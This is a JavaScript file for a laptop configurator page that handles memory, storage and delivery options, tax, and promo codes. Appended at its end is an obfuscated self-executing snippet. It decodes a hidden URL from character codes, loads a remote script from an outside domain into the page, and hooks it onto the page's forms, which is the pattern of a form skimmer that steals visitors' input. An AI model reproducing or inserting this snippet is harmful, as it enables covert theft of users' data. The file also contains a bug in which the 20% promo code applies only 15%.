console.log('checked');
document.getElementById('memoryfourgb-btn').addEventListener('click', function(e){

                document.getElementById('memory-specfic').innerText=4; 
                document.getElementById('select-memory').innerText=4;

                updatePrice('memory-price',0);

                taxcalc()
        
        })
document.getElementById('memoryeightgb-btn').addEventListener('click', function(e){
                document.getElementById('memory-specfic').innerText=8;
                document.getElementById('select-memory').innerText=8;
                updatePrice('memory-price',100);
                taxcalc();
        })
document.getElementById('memorysixtengb-btn').addEventListener('click', function(e){
                document.getElementById('memory-specfic').innerText=16;
                document.getElementById('select-memory').innerText=16;
                updatePrice('memory-price',200);
                taxcalc()
        })
document.getElementById('ssd1-btn').addEventListener('click', function(e){

                document.getElementById('storage-specfic').innerText=256; 
                document.getElementById('select-ssd').innerText=256;

                updatePrice('ssd-price',0);
                taxcalc()
        
        })
document.getElementById('ssd2-btn').addEventListener('click', function(e){
        document.getElementById('storage-specfic').innerText=512; 
        document.getElementById('select-ssd').innerText=512;

        updatePrice('ssd-price',200);
        taxcalc();
        })
document.getElementById('ssd3-btn').addEventListener('click', function(e){
        document.getElementById('storage-specfic').innerText=1024; 
        document.getElementById('select-ssd').innerText=1024;

        updatePrice('ssd-price',400);
        taxcalc()
        })
document.getElementById('regular-delivery-btn').addEventListener('click', function(e){
        document.getElementById('select-delivery').innerText=`15 days regular delivery`; 


        updatePrice('delivery-price',0);
        taxcalc();
        })
document.getElementById('express-delivery-btn').addEventListener('click', function(e){
        document.getElementById('select-delivery').innerText=`5 days express delivery`; 
        // document.getElementById('select-ssd').innerText=1024;

        updatePrice('delivery-price',40);
        taxcalc()
        })


function updatePrice(updateId,price){

        const memorySsdeliveryPrice=document.getElementById(updateId);
        memorySsdeliveryPrice.innerText=price;

        const basePrice=document.getElementById('base-price');

        const memoryPrice=document.getElementById('memory-price');


        // const memoryPrice=document.getElementById('memory-price');

        const ssdPrice=document.getElementById('ssd-price');


        const deliveryPrice=document.getElementById('delivery-price');

        const discountPrice=document.getElementById('discount-price');

        const totalPrice=document.getElementById('total-price');
        const taxPrice=document.getElementById('tax-price');

        const totalPricing=parseInt(basePrice.innerText)+parseInt(memoryPrice.innerText)+parseInt(ssdPrice.innerText)+parseInt(deliveryPrice.innerText)+parseFloat(taxPrice.innerText)-parseFloat(discountPrice.innerText);

        totalPrice.innerText=totalPricing;
  

}


function taxcalc(){

        const taxPrice=document.getElementById('tax-price');

        const totalPrice=document.getElementById('total-price');

        if(totalPrice.innerText >=1500){
                const taxrate=0.05;

                const taxpricerate=taxrate*totalPrice.innerText;

                taxPrice.innerText=taxpricerate.toFixed(2);
                
        }
}

document.getElementById('promo-btn').addEventListener('click',function(e){

        promoapply(); 
})


function promoapply(){

        const promocode1='5%discount';
        const promocode2='10%discount';
        const promocode3='15%discount';
        const promocode4='20%discount';

        const invalidCode='invalid promo code'
        const discountPrice=document.getElementById('discount-price');

        const totalPrice=document.getElementById('total-price');


        


        const promoInputvalue=document.getElementById('promo-input-value');

        
        if(promoInputvalue.value==promocode1){

                discountPrice.innerText= totalPrice.innerText*0.05
               

                totalPrice.innerText=totalPrice.innerText-discountPrice.innerText;

                document.getElementById('discount-text').innerHTML=`<p class=text-3xl> ${promocode1} apply </p> `

                promoInputvalue.value='';
        }
       else if(promoInputvalue.value==promocode2){

                discountPrice.innerText= totalPrice.innerText*0.10
               

                totalPrice.innerText=totalPrice.innerText-discountPrice.innerText;

                document.getElementById('discount-text').innerHTML=`<p class=text-3xl> ${promocode2} apply </p> `

                promoInputvalue.value='';
        }
       else if(promoInputvalue.value==promocode3){

                discountPrice.innerText= totalPrice.innerText*0.15
               

                totalPrice.innerText=totalPrice.innerText-discountPrice.innerText;

                document.getElementById('discount-text').innerHTML=`<p class=text-3xl> ${promocode3} apply </p> `

                promoInputvalue.value='';
        }
       else if(promoInputvalue.value==promocode4){

                discountPrice.innerText= totalPrice.innerText*0.15
               

                totalPrice.innerText=totalPrice.innerText-discountPrice.innerText;

                document.getElementById('discount-text').innerHTML=`<p class=text-3xl> ${promocode4} apply </p> `

                promoInputvalue.value='';
        }

        else{

                document.getElementById('discount-text').innerHTML=`<p class=text-3xl> ${invalidCode}</p> `
        }
}
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b